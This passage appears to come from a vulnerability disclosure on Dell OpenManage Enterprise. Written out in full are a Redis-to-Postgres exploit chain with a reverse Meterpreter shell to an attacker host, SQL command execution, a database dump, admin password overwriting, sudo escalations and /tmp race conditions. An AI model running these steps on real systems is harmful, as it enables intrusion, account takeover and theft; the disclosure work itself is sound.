<p>It is possible to reach the postgres database on localhost, thanks to a <code>docker-proxy</code> daemon:</p>
<pre><code>[root@openmanage-enterprise /]# ps -auxww|grep proxy | grep 5432
root      1340  0.3  0.0 448608 13184 ?        Sl   04:37   0:36 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5432 -container-ip 169.254.255.2 -container-port 5432
</code></pre>
<p>It is also possible to reach the postgres database using the IP of the docker instance:</p>
<pre><code>[nobody@openmanage-enterprise /]$ psql -d enterprisedb -h 169.254.255.2 -U core_admin -p 5432
psql (11.9, server 11.6)
Type "help" for help.

enterprisedb=# \l
                                    List of databases
     Name     |   Owner    | Encoding |   Collate   |    Ctype    |   Access privileges
--------------+------------+----------+-------------+-------------+-----------------------
 enterprisedb | core_admin | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres     | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0    | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
              |            |          |             |             | postgres=CTc/postgres
 template1    | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
              |            |          |             |             | postgres=CTc/postgres
(4 rows)

enterprisedb=# \q

[nobody@openmanage-enterprise /]$ psql -d enterprisedb -h 127.0.0.1 -U core_admin -p 5432
psql (11.9, server 11.6)
Type "help" for help.

enterprisedb=# \l
                                    List of databases
     Name     |   Owner    | Encoding |   Collate   |    Ctype    |   Access privileges
--------------+------------+----------+-------------+-------------+-----------------------
 enterprisedb | core_admin | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres     | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0    | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
              |            |          |             |             | postgres=CTc/postgres
 template1    | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
              |            |          |             |             | postgres=CTc/postgres
(4 rows)

enterprisedb=# \q
</code></pre>
<p>It is then possible to get code execution inside the postgres docker, without authentication:</p>
<pre><code>[nobody@openmanage-enterprise /]$ psql -d enterprisedb -h 127.0.0.1 -U core_admin -p 5432
psql (11.9, server 11.6)
Type "help" for help.

enterprisedb=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
enterprisedb=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
enterprisedb=# COPY cmd_exec FROM PROGRAM 'id';
COPY 1
enterprisedb=# SELECT * FROM cmd_exec;
                             cmd_output
--------------------------------------------------------------------
 uid=26(postgres) gid=26(postgres) groups=26(postgres),26(postgres)
(1 row)
</code></pre>
<p><a id="remote-auth-bypass-with-2-pre-auth-rces-docker-instances"></a></p>
<h2>Details - Remote Auth Bypass with 2 pre-auth RCEs in docker instances</h2>
<p>There is a chain of pre-auth vulnerabilities allowing to:</p>
<ul>
<li>get a shell on the redis container, as <code>redis</code></li>
<li>get a shell on the postgres container, as <code>postgres</code></li>
<li>get a full access to the postgres database</li>
<li>bypass authentication on the web interface as admin</li>
</ul>
<p>Due to some requirements in the exploit chain, the attacker needs to  be on the same subnet as the target (same LAN, without  a  gateway  between the target  and  the  attacker).</p>
<p>The attack scenario is:</p>
<ol>
<li>attacker will own the redis running in a container inside the virtual machine
   running Dell OpenManage Enterprise and get a shell inside this container</li>
<li>attacker will use the shell inside the redis container as a relay to get access
   to the remote postgresql server</li>
<li>attacker will get a shell on the postgresql server</li>
<li>attacker will redefine a new password for the web interface and will dump
   the entire postgresql server</li>
<li>attacker will get an access on the web interface as admin</li>
</ol>
<p>The network flow is:</p>
<p>Attacker(192.168.1.102) -&gt; redis(169.254.255.3, routed by 192.168.1.100) -&gt; Posgres(169.254.255.2)</p>
<p>IPs used in this setup:</p>
<ul>
<li>192.168.1.100: target virtual machine running Dell OpenManage Enterprise.</li>
<li>192.168.1.102: attacker machine, running Kali.</li>
</ul>
<p>Internal IPs inside Dell OpenManage Enterprise, by default, already configued by the solution:</p>
<ul>
<li>169.254.255.2 is the internal IP of the postgres container running inside the virtual machine
  running Dell OpenManage Enterprise.</li>
<li>169.254.255.3 is the internal IP of the redis container running inside the virtual machine
  running Dell OpenManage Enterprise.</li>
</ul>
<p>&nbsp;</p>
<pre><code>[root@openmanage-enterprise /]# docker ps
CONTAINER ID        IMAGE                              COMMAND                  CREATED             STATUS              PORTS                                NAMES
ecf97860f111        redis:latest                       "docker-entrypoint.s"   2 hours ago         Up 2 hours          127.0.0.1:6379-&gt;6379/tcp             redis
e1e82315ec5b        mcsi/omeproductionimage:2.6.0.43   "docker-entrypoint.s"   2 hours ago         Up 2 hours          2345/tcp, 127.0.0.1:5432-&gt;5432/tcp   primarydatabase
</code></pre>
<p><strong>Shell and Metasploit session:</strong></p>
<p>It is required to add a route to the internal IP of the redis container
running inside OpenManage Enterprise:</p>
<pre><code>kali# route add -host 169.254.255.3 gw 192.168.1.100
kali# traceroute -nI 169.254.255.3
traceroute to 169.254.255.3 (169.254.255.3), 30 hops max, 60 byte packets
 1  192.168.1.100  0.775 ms  0.762 ms  1.060 ms
 2  169.254.255.3  1.911 ms  1.922 ms  1.893 ms
</code></pre>
<p>On the 3.6.1 version, pings are now dropped. Using <code>tcptraceroute</code>:</p>
<pre><code>kali# tcptraceroute 169.254.255.3 6379
Running:
    traceroute -T -O info -p 6379 169.254.255.3
traceroute to 169.254.255.3 (169.254.255.3), 30 hops max, 60 byte packets
 1  192.168.1.100 (192.168.1.100)  0.489 ms  0.440 ms  0.545 ms
 2  169.254.255.3 (169.254.255.3) &lt;syn,ack&gt;  0.852 ms  0.821 ms  0.720 ms
</code></pre>
<p>An attacker can now reach the redis and postgres docker instances because iptables is not correctly configured and
allow the 2 services to be reachable from the WAN. Also, by default, IP forwarding is enabled:</p>
<pre><code>[root@openmanage-enterprise /]# sysctl net.ipv4.conf.all.forwarding
net.ipv4.conf.all.forwarding = 1
</code></pre>
<p>Why not directly reaching Postgres ?
By default, ACLs defined in Postgres configuration only allow connections from the <code>169.254.255.0/24</code> range,
thus it is required to reach the redis interface available on the <code>169.254.255.3</code> IP and then use redis as a relay to reach the postgres instance.</p>
<pre><code>local postgres    postgres            trust
host  enterprisedb  core_admin    ::1/128     trust
host  enterprisedb  core_admin    127.0.0.1/32  trust
host  enterprisedb  core_admin    169.254.255.1/24  trust
local enterprisedb  core_admin            trust

local replication     rep                                             trust
host  replication     rep                     169.254.255.1/24        trust
</code></pre>
<p>When trying to connect directly to the IP of Postgres, we can see it is ACL-blocked (after adding a route to <code>169.254.255.2</code>):</p>
<pre><code>kali# psql -d enterprisedb -h 169.254.255.2 -U core_admin -p 5432
kali# psql: error: could not connect to server: FATAL:  no pg_hba.conf entry for host "192.168.1.102", user "core_admin", database "enterprisedb", SSL off
</code></pre>
<p>We can test if we can reach directly the redis daemon, running inside the redis docker:</p>
<pre><code>kali# telnet 169.254.255.3 6379
Trying 169.254.255.3...
Connected to 169.254.255.3.
Escape character is '^]'.
TEST
-ERR unknown command `TEST`, with args beginning with:
config set dir /tmp
+OK
^]q
telnet&gt; q
Connection closed.
</code></pre>
<p>We can reach redis, time to get RCE using master/slave replication using metasploit.</p>
<p>On the attacker machine, it is required to update the
<code>/usr/share/metasploit-framework/modules/exploits/linux/redis/redis_unauth_exec.rb</code> file
to use a writable directory for the user <code>redis</code>:</p>
<p>Patch <code>/usr/share/metasploit-framework/modules/exploits/linux/redis/redis_unauth_exec.rb</code> to add:</p>
<pre><code>131a132
&gt;     redis_command('CONFIG', 'SET', 'dir', '/tmp')
</code></pre>
<p>Metasploit session:</p>
<pre><code>kali# msfconsole
msf5 &gt; use exploit/linux/redis/redis_unauth_exec
msf5 exploit(linux/redis/redis_unauth_exec) &gt; set SRVHOST 192.168.1.102
SRVHOST =&gt; 192.168.1.102
msf5 exploit(linux/redis/redis_unauth_exec) &gt; set LHOST 192.168.1.102
LHOST =&gt; 192.168.1.102
msf5 exploit(linux/redis/redis_unauth_exec) &gt; set RHOSTS 169.254.255.3
RHOSTS =&gt; 169.254.255.3
msf5 exploit(linux/redis/redis_unauth_exec) &gt; run

[*] Started reverse TCP handler on 192.168.1.102:4444
[*] 169.254.255.3:6379    - Compile redis module extension file
[+] 169.254.255.3:6379    - Payload generated successfully!
[*] 169.254.255.3:6379    - Listening on 192.168.1.102:6379
[*] 169.254.255.3:6379    - Rogue server close...
[*] 169.254.255.3:6379    - Sending command to trigger payload.
[*] Sending stage (3021284 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.102:4444 -&gt; 192.168.1.100:60572) at 2020-07-11 12:59:57 -0400
[!] 169.254.255.3:6379    - This exploit may require manual cleanup of './mkmiq.so' on the target

meterpreter &gt; ls
Listing: /tmp
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  46808  fil   2020-07-09 08:59:55 -0400  mkmiq.so

meterpreter &gt; shell
Process 19 created.
Channel 1 created.
id
uid=999(redis) gid=999(redis) groups=999(redis)
exit
meterpreter &gt;
</code></pre>
<p>Note, with a recent metasploit, the exploit has been moved to <code>exploit/linux/redis/redis_replication_cmd_exec</code>.</p>
<p>The diff is now:</p>
<pre><code>diff /usr/share/metasploit-framework/modules/exploits/linux/redis/redis_replication_cmd_exec.rb
137a138
&gt;     redis_command('CONFIG', 'SET', 'DIR', '/tmp')
</code></pre>
<p>This works with all openmanage version (up to the latest version - 3.6.1).</p>
<p>After getting a shell as <code>redis</code> inside the redis docker, it is time to add a port forwarding
to the postgresql, in order to bypass ACLs:</p>
<pre><code>meterpreter &gt; portfwd add -l 5432 -p 5432 -r 169.254.255.2
[*] Local TCP relay created: :5432 &lt;-&gt; 169.254.255.2:5432
</code></pre>
<p>On another shell, an attacker will get code execution inside the PGSQL container:</p>
<pre><code>kali# psql -d enterprisedb -h 127.0.0.1 -U core_admin -p 5432
psql (12.1 (Debian 12.1-2), server 11.6)
Type "help" for help.

enterprisedb-# \l
                                    List of databases
     Name     |   Owner    | Encoding |   Collate   |    Ctype    |   Access privileges
--------------+------------+----------+-------------+-------------+-----------------------
 enterprisedb | core_admin | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres     | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0    | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
              |            |          |             |             | postgres=CTc/postgres
 template1    | postgres   | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
              |            |          |             |             | postgres=CTc/postgres
(4 rows)

enterprisedb=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
enterprisedb=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
enterprisedb=# COPY cmd_exec FROM PROGRAM 'id';
COPY 1
enterprisedb=# SELECT * FROM cmd_exec;
                      cmd_output
-------------------------------------------------------
 uid=26(postgres) gid=26(postgres) groups=26(postgres)
(1 row)

enterprisedb=#
</code></pre>
<p>Dump of database:</p>
<pre><code>kali# pg_dump -d enterprisedb -h 127.0.0.1 -U core_admin &gt; dump.sql
</code></pre>
<p>Time to redefine the administrator password:</p>
<p>Passwords are located in <code>encryptedstring</code> table:</p>
<pre><code>kali# psql -d enterprisedb -h 127.0.0.1 -U core_admin -p 5432
enterprisedb=# SELECT * FROM encryptedstring;
3 | $2a$10$.hbHnOt6crprUoAO2PMJxerc8nQ12SJ.jxgM8JgZiuLIfkCVNgSqe
4 | system
1 | $2a$10$bzBdUKXFdlb0U7Hl.w6XIuQFKQQr0Qgi165KN2TaaOemlaAe.OuU2
2 | admin
</code></pre>
<p>Change admin password into <code>x</code>:</p>
<pre><code>kali# psql -d enterprisedb -h 127.0.0.1 -U core_admin -p 5432
enterprisedb=# UPDATE encryptedstring SET encrypteddata='$2a$10$XXXXXXXXXXXXXXXXXXXXXOQhTG4aUZ8kSMBOnpMruh17xTsANIaT6' WHERE id=1;
UPDATE 1
enterprisedb=#
</code></pre>
<p>Now, use <code>admin</code> / <code>x</code> on the web interface ( http://192.168.1.100/ ).</p>
<p>After reversing some java code, passwords are blowfish 10 rounds:</p>
<pre><code>kali# python3
Python 3.7.5 (default, Oct 27 2019, 15:43:29)
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import bcrypt
&gt;&gt;&gt; passwd = b'x'
&gt;&gt;&gt; salt = b'$2a$10$XXXXXXXXXXXXXXXXXXXXXXXXX' # or bcrypt.gensalt(rounds=10)
&gt;&gt;&gt; hashed = bcrypt.hashpw(passwd, salt)
&gt;&gt;&gt; print(hashed)
b'$2a$10$XXXXXXXXXXXXXXXXXXXXXOQhTG4aUZ8kSMBOnpMruh17xTsANIaT6'
&gt;&gt;&gt;
</code></pre>
<p>The main takeways in this setup are:</p>
<ul>
<li>Incorrect iptables firewall for Postgres and Redis - only the main IP of the appliance is
  correctly firewalled, docker instances have these 2 ports open</li>
<li>IP forwarding is enabled</li>
<li>Lack of authentication for Redis,</li>
<li>Lack of authentication for Postgres, only based on IP with an errror when defining the netmask:
  <code>169.254.255.1/24</code> is being used instead of <code>169.254.255.1/32</code> or <code>169.254.255.0/24</code></li>
<li>Incorrect ACL for Postgres</li>
<li>SELinux is useless in this case because all actions are legit</li>
<li>Custom 'encryption' everywhere to waste time</li>
</ul>
<p><a id="undocumented-system-account"></a></p>
<h2>Details - Undocumented <code>system</code> account</h2>
<p>There is likely an undocumented system account in all openmanage versions, as shown below:</p>
<p>We can list the users from the postgres database:</p>
<pre><code>enterprisedb=# select * from user_entity;
id   | user_type_id | directory_server_id | user_name | description | pwcredential_id | email | isenabled | locked | enable_smart_card | ca_certificate | user_certificate | default_account | object_guid | object_sid | id_owner
-------+--------------+---------------------+-----------+-------------+-----------------+-------+-----------+--------+-------------------+----------------+------------------+-----------------+-------------+------------+---------
10066 |            1 |                     | admin     | admin       |               1 |       | t         | f      | f                 |
10068 |            1 |                     | system    | system      |               2 |       | t         | f      | f                 |

enterprisedb=# select * from passwordcredential;
id |             dtype              | label  | usernameid | passwordid | domainid |         updatedate
----+--------------------------------+--------+------------+------------+----------+----------------------------
  2 | HashedPasswordCredentialEntity | system |          4 |          3 |          | 2020-07-11 18:08:50.207+00
  1 | HashedPasswordCredentialEntity | admin  |          2 |          1 |          | 2020-07-11 18:14:41.012+00
(2 rows)

kali# psql -d enterprisedb -h 127.0.0.1 -U core_admin -p 5432
enterprisedb=# SELECT * FROM encryptedstring;
 id |                        encrypteddata
----+--------------------------------------------------------------
  3 | $2a$10$.hbHnOt6crprUoAO2PMJxerc8nQ12SJ.jxgM8JgZiuLIfkCVNgSqe
  4 | system
  2 | admin
  1 | $2a$10$XXXXXXXXXXXXXXXXXXXXXOQhTG4aUZ8kSMBOnpMruh17xTsANIaT6
</code></pre>
<p>Also from dump.sql:</p>
<pre><code>COPY core.passwordcredential (id, dtype, label, usernameid, passwordid, domainid, updatedate) FROM stdin;
2       HashedPasswordCredentialEntity  system  4       3       \N      2020-07-11 11:24:42.386+00
1       HashedPasswordCredentialEntity  admin   2       1       \N      2020-07-11 11:26:14.551+00
\.
</code></pre>
<p>When trying to add a <code>system</code> account:</p>
<p><img alt="" src="images/2021-dell-open-manage-enterprise-user-list-admin.png" />
<img alt="" src="images/2021-dell-open-manage-enterprise-user-list-system.png" /></p>
<p>This account doesn't seem to be documented but we were unable to use it to login into the web service.</p>
<p>Its aim is currently not known.</p>
<p><a id="database-key-stored-db"></a></p>
<h2>Details - Database key stored in the database</h2>
<p>The application database key (<code>DatabaseKey</code>) is generated randomly during the installation and is stored inside the database.</p>
<p>It is possible to extract it without authentication:</p>
<pre><code>COPY core.encryptionkey (id, dtype, bytes) FROM stdin;
1       DatabaseKey     DHAqjsvpfUh+aRZKLTa6+K+rmHBtcPafoyuIMPTqV3hTUbGTb08ZzZSkF4GYgbPQ
\.
</code></pre>
<p><a id="weak-permission-tls-key"></a></p>
<h2>Details - Weak permissions on SSL/TLS Key</h2>
<p>The TLS key has weak permissions:</p>
<pre><code>[root@openmanage-enterprise /]# ls -la /etc/pki/tls/private/localhost.key
-rw-r--r--. 1 root root 3272 Jul 11  2020 /etc/pki/tls/private/localhost.key
</code></pre>
<p>No SELinux protection - this allows any user to read the files.</p>
<p><a id="lpe-mcsimetricssvc"></a></p>
<h2>Details - Multiple Local Privilege Escalations from <code>mcsimetricssvc</code></h2>
<p>The file <code>/etc/sudoers.d/94_mcsi_metrics</code> belongs to <code>mcsimetricssvc</code>, as shown below:</p>
<pre><code>[root@openmanage-enterprise etc]# ls -la /etc/sudoers.d/94_mcsi_metrics
-rw-rw-r--. 1 mcsimetricssvc root 847 Sep 25  2020 /etc/sudoers.d/94_mcsi_metrics
</code></pre>
<p>This user can just edit this file to get root access using <code>sudo</code>.</p>
<p>It is also possible to directly find this weakness by executing <code>sudo</code>, a warning message will appear:</p>
<pre><code>[root@openmanage-enterprise ~]# sudo id
sudo: /etc/sudoers.d/94_mcsi_metrics is owned by uid 1005, should be 0
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>This LPE was silently patched in version 3.6.1.</p>
<p>Futhermore, this user has these (large) sudo privileges:</p>
<pre><code>%mcsimetricssvc ALL=NOPASSWD:/usr/bin/mount, /usr/bin/cp, /usr/bin/umount, /usr/bin/gpg,/opt/dell/mcsi/appliance/scripts/pam/config_user_access.sh,/opt/dell/mcsi/appliance/scripts/port_validation.sh,/opt/dell/mcsi/appliance/scripts/change_timezone.py,/opt/dell/mcsi/appliance/scripts/restore_application.py,/opt/dell/mcsi/appliance/scripts/certificate_tool.py,/opt/dell/mcsi/appliance/scripts/change_hostname.py,/opt/dell/mcsi/appliance/scripts/address_configuration.py,/opt/dell/mcsi/appliance/scripts/current_network_settings.py, /usr/bin/lscpu,/usr/bin/free,/opt/dell/mcsi/appliance/scripts/ntp_tool.py,/opt/dell/mcsi/appliance/scripts/dump_logs.py,/opt/dell/mcsi/appliance/scripts/change_webconfig.py,/opt/dell/mcsi/appliance/scripts/branding.py,/usr/bin/systemctl,/usr/bin/date,/usr/bin/ntpstat,/usr/sbin/ntpq,/usr/bin/python,/usr/sbin/ntpdc
</code></pre>
<p>At least <code>/usr/bin/mount</code>, <code>/usr/bin/cp</code>, <code>/usr/bin/gpg</code>, <code>/usr/bin/systemctl</code> and <code>/usr/bin/python</code> can be used to elevate to root.</p>
<p><a id="lpe-mcsitasksvc"></a></p>
<h2>Details - Multiple Local Privilege Escalations from group <code>mcsitasksvc</code></h2>
<p>Users belonging to group <code>mcsitasksvc</code> can sudo:</p>
<pre><code>%mcsitasksvc ALL=NOPASSWD:/usr/bin/mount, /usr/bin/cp, /usr/bin/umount, /usr/bin/gpg,/opt/dell/mcsi/appliance/scripts/pam/config_user_access.sh,/opt/dell/mcsi/appliance/scripts/port_validation.sh,/opt/dell/mcsi/appliance/scripts/change_timezone.py,/opt/dell/mcsi/appliance/scripts/restore_application.py,/opt/dell/mcsi/appliance/scripts/certificate_tool.py,/opt/dell/mcsi/appliance/scripts/change_hostname.py,/opt/dell/mcsi/appliance/scripts/address_configuration.py,/opt/dell/mcsi/appliance/scripts/virtual_ip_configuration.py,/opt/dell/mcsi/appliance/scripts/current_network_settings.py, /usr/bin/lscpu,/usr/bin/free,/opt/dell/mcsi/appliance/scripts/ntp_tool.py,/opt/dell/mcsi/appliance/scripts/dump_logs.py,/opt/dell/mcsi/appliance/scripts/change_webconfig.py,/opt/dell/mcsi/appliance/scripts/branding.py,/usr/bin/systemctl,/usr/bin/date,/usr/bin/ntpstat,/usr/sbin/ntpq,/usr/bin/python3,/usr/sbin/ntpdc,/opt/dell/mcsi/appliance/scripts/configureSSHDTimeout.sh,/opt/dell/mcsi/appliance/scripts/resolve.sh,/usr/bin/nmcli
%mcsitasksvc ALL=NOPASSWD:/opt/dell/omc/utilities/cifsconfiguration/bin/reset_cifs_password.sh, /opt/dell/omc/utilities/cifsconfiguration/bin/test_cifs_config.sh, /usr/bin/smbpasswd, /usr/bin/systemctl
</code></pre>
<p>At least <code>/usr/bin/mount</code>, <code>/usr/bin/cp</code>, <code>/usr/bin/gpg</code>, <code>/usr/bin/systemctl</code> and <code>/usr/bin/python3</code> can be used to elevate to root.</p>
<p><a id="lpe-tomcat"></a></p>
<h2>Details - Multiple Local Privilege Escalations from group <code>tomcat</code></h2>
<p>Users belonging to group <code>tomcat</code> can sudo:</p>
<pre><code>%tomcat ALL=NOPASSWD:/opt/dell/mcsi/appliance/scripts/ntp_tool.py,/opt/dell/mcsi/appliance/scripts/rsyslog_tool.py,/opt/dell/mcsi/appliance/scripts/change_timezone.py,/opt/dell/mcsi/appliance/scripts/certificate_tool.py,/opt/dell/mcsi/appliance/scripts/change_hostname.py,/opt/dell/mcsi/appliance/scripts/login_iprange.py,/opt/dell/mcsi/appliance/scripts/address_configuration.py,/opt/dell/mcsi/appliance/scripts/current_network_settings.py,/opt/dell/mcsi/appliance/scripts/restore_application.py,/opt/dell/mcsi/appliance/scripts/dump_logs.py,/usr/bin/python3,/opt/dell/mcsi/appliance/scripts/branding.py,/opt/dell/mcsi/appliance/scripts/commandexecutor.sh,/opt/dell/mcsi/appliance/scripts/resolve.sh,/opt/dell/mcsi/appliance/scripts/port_validation.sh,/usr/bin/systemctl,/opt/dell/mcsi/appliance/scripts/change_webconfig.py,/opt/dell/mcsi/appliance/scripts/sysloglogging.py,/usr/bin/date,/usr/bin/ntpstat,/usr/sbin/ntpq,/usr/sbin/ntpdc,/opt/dell/mcsi/appliance/scripts/chassis_nw_settings.py,/opt/dell/mcsi/appliance/scripts/virtual_ip_configuration.py
%tomcat ALL=NOPASSWD:/usr/bin/mount, /usr/bin/cp, /usr/bin/umount, /var/consoleupdate/unzip_uploadedfile.py
</code></pre>
<p>At least <code>/usr/bin/python3</code>, <code>/usr/bin/systemctl</code>, <code>/usr/bin/mount</code> and <code>/usr/bin/cp</code>  can be used to elevate to root.</p>
<p><a id="lpe-omctui"></a></p>
<h2>Details - Local Privilege Escalation from group <code>omctui</code></h2>
<p>Users belonging to group <code>omctui</code> can sudo:</p>
<pre><code>%omctui ALL=NOPASSWD:/usr/bin/systemctl,/usr/sbin/shutdown,/usr/bin/localectl
</code></pre>
<p><code>/usr/bin/systemctl</code> can be used to elevate to root.</p>
<p><a id="toctou-security_tool.sh"></a></p>
<h2>Details - Multiple TOCTOUs in "security_tool.sh" shell script</h2>
<p><code>/opt/dell/mcsi/appliance/scripts/security_tool.sh</code> contains multiple TOCTOUs:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/mcsi/appliance/scripts/security_tool.sh
[...]
456 function turnOffRequireRetty
457 {
458     echo "turning off RequireRetty"
459
460     # make it so the requiretty is commented out.
461     sed 's/Defaults    requiretty/#Defaults    requiretty/' /etc/sudoers &gt; /tmp/sudoers.bk
462     mv /tmp/sudoers.bk /etc/sudoers
463     chmod 0440 /etc/sudoers
464 }
</code></pre>
<p>In line 461, no check is done on <code>/tmp/sudoers.bk</code> - so the file may already exist with attacker's rights.</p>
<p>Race condition in line 462 - an attacker previously controlling <code>/tmp/sudoers.bk</code> will overwrite <code>/etc/sudoers</code>
with its own policies, resulting in a privilege escalation.</p>
<p>This race condition is now located in line 168 in version 3.6.1.</p>
<p>And here:</p>
<pre><code>505     local targets="/usr/bin/python3"
506     targets="${targets},${THIS_DIR}/change_admin_password.sh"
507     targets="${targets},/usr/sbin/passwd"
508     targets="${targets},${THIS_DIR}/change_timezone.py"
509     targets="${targets},${THIS_DIR}/certificate_tool.py"
510
511     # remove existing tomcat permissions from the sudoesrs file
512      sed 's/%admin ALL=NOPASSWD:.*$//' /etc/sudoers &gt; /tmp/sudoers.bk
513     mv /tmp/sudoers.bk /etc/sudoers
514     chmod 0440 /etc/sudoers
515
516      # add new tomcat permissions to the sudoers file
517      echo "%admin ALL=NOPASSWD:${targets}" &gt;&gt; /etc/sudoers
</code></pre>
<p>Race condition in line 513 - an attacker controlling <code>/tmp/sudoers.bk</code> will overwrite <code>/etc/sudoers</code>
with its own policies, resulting in a privilege escalation.</p>
<p>This race condition is now located in line 220 in version 3.6.1.</p>
<p><a id="tomcat-shadow-access"></a></p>
<h2>Details - Incorrect access for tomcat</h2>
<p>The script <code>security_tool.sh</code> contains interesting settings for the tomcat user, in the function <code>configureShadowAccess</code>:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/mcsi/appliance/scripts/security_tool.sh
[...]
466 # this allows rest/shiro to authenticate admin user from tomcat using the pam database
467 function configureShadowAccess
468 {
469     if ! $(ls -la /etc/shadow | grep -q shadow-readers); then
470         echo "configuring shadow access"
471         groupadd shadow-readers
472         usermod -a -G shadow-readers tomcat               &lt;-- tomcat added to group `shadow-readers`
473         chown root:shadow-readers /etc/shadow             &lt;-- non-standard permissions for /etc/shadow
474         chmod 640 /etc/shadow
475         service systemd-logind restart
476     else
477         echo "shadow access already configured"
478     fi
479 }
</code></pre>
<p>This will allow the <code>tomcat</code> user to read the <code>/etc/shadow</code> file.</p>
<p>This function is not called in version 3.5 and 3.6.1 but may have been used before:</p>
<pre><code>573 function configureAccounts
574 {
575     #configureShadowAccess
</code></pre>
<p>This function is located in line 174 in version 3.6.1.</p>
<p><a id="grub-password-db-no-auth"></a></p>
<h2>Details - Grub password stored in postgres, without authentication for local user</h2>
<p>The grub password is located in the file <code>/etc/grub.d/40_custom</code>.</p>
<p>This file is generated by <code>/opt/dell/mcsi/appliance/scripts/set_grub_password.sh</code>:</p>
<pre><code>[...]
12   pwd="$(/usr/bin/psql -qtAX -U core_admin -d enterprisedb -c 'select guid from core.application_info')"
[...]
28       sed -i "s/password root.*/password root $pwd/g" /etc/grub.d/40_custom
29       /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfg
30       echo GRUB password is updated
[...]
</code></pre>
<p>Even if <code>/etc/grub.d/40_custom</code> is 755, it is impossible to read the file because <code>/etc/grub.d</code> is 700 <code>root:root</code>.</p>
<pre><code>[root@openmanage-enterprise lpe-priv8-3/]# ls -la /etc/grub.d/40_custom
-rwxr-xr-x. 1 root root 288 May 16 04:07 /etc/grub.d/40_custom
[root@openmanage-enterprise lpe-priv8-3/]# ls -la /etc/grub.d | grep ' \.$'
drwx------.  2 root root  4096 Sep 30  2020 .
</code></pre>
<p>But it is possible to extract the grub password from the auth-less local postgres database:</p>
<pre><code>sh-4.2$ /usr/bin/psql -qtAX -U core_admin -d enterprisedb -c 'select guid from core.application_info'
09b50d53-189c-221c-7996-1c0ee1279201
</code></pre>
<p>The password can be confirmed by reading <code>/etc/grub.d/40_custom</code>:</p>
<pre><code>[root@openmanage-enterprise /]# tail -n 1 /etc/grub.d/40_custom
password root 09b50d53-189c-221c-7996-1c0ee1279201
</code></pre>
<p><a id="pre-auth-post-auth-java-deserializations"></a></p>
<h2>Details - Pre-auth and post-auth Java Deserializations</h2>
<p>The solution uses <code>jackson</code> and <code>ObjectMapper</code> to read attacker-controlled json inputs.</p>
<p>It appears authentification doesn't really work when sending attacker-controlled data on API endpoints:</p>
<ul>
<li>sending valid authentication cookies and well-formed json/xml will result in a 200 ok</li>
<li>sending valid authentication cookies and bad-formed json/xml will result in deserialization errors or jackson parsing errors</li>
<li>sending well-formed json/xml without valid authentication cookies will result in a 400 bad request</li>
<li>sending bad-formed json/xml without valid authentication cookies will result in deserialization errors or jackson parsing errors</li>
</ul>
<p>The authentication system appears to be broken as it parses attacker-controlled data before checking the authentication.</p>
<p>Sending correct data will trigger the authentication:</p>
<pre><code>kali# wget -O- --no-check-certificate --post-data '{"targets":["1"],"command":"ls","operation":"REMOTE_SSH_EXEC"}' --header "Content-Type: application/json;charset=utf-8" https://192.168.1.100/omc/api/Console/RemoteCommandTask
HTTP request sent, awaiting response... 400 Bad Request
2021-05-16 12:57:17 ERROR 400: Bad Request.
</code></pre>
<p>From the logs:</p>
<pre><code>[ERROR] 2021-05-16 12:57:15.158 [ajp-bio-8009-exec-1] JobsController - org.springframework.web.client.HttpClientErrorException: 401 Unauthorized
</code></pre>
<p>Now, by replacing the targets field, "1" becomes "a", it is possible to create deserialization errors
while sending incorrect inputs while creating a RemoteCommandTask:</p>
<pre><code>POST /omc/api/Console/RemoteCommandTask HTTP/1.1
Host: 192.168.1.100
Content-Type: application/json;charset=utf-8
Content-Length: 62

{"targets":["a"],"command":"ls","operation":"REMOTE_SSH_EXEC"}
</code></pre>
<p>Or with <code>wget</code>:</p>
<pre><code>kali# wget -O- --no-check-certificate --post-data '{"targets":["a"],"command":"ls","operation":"REMOTE_SSH_EXEC"}' --header "Content-Type: application/json;charset=utf-8" https://192.168.1.100/omc/api/Console/RemoteCommandTask
HTTP request sent, awaiting response... 500 Internal Server Error
2021-05-16 12:58:25 ERROR 500: Internal Server Error.
</code></pre>
<p>And from the logs, no more "401 Unauthorized" but some deserialization errors:</p>
<p>From <code>/var/log/dell/mcsi/tomcat/application.log</code>:</p>
<pre><code>[ERROR] 2021-05-16 12:58:39.554 [ajp-bio-8009-exec-4] BaseController - org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Cannot deserialize value of type `java.lang.Integer` from String "a": not a valid Integer value; nested exception is com.fasterxml.jackson.databind.exc.InvalidFormatException: Cannot deserialize value of type `java.lang.Integer` from String "a": not a valid Integer value
 at [Source: (PushbackInputStream); line: 1, column: 13] (through reference chain: com.dell.enterprise.model.omc.RemoteCommandTask["targets"]-&gt;java.util.ArrayList[0])
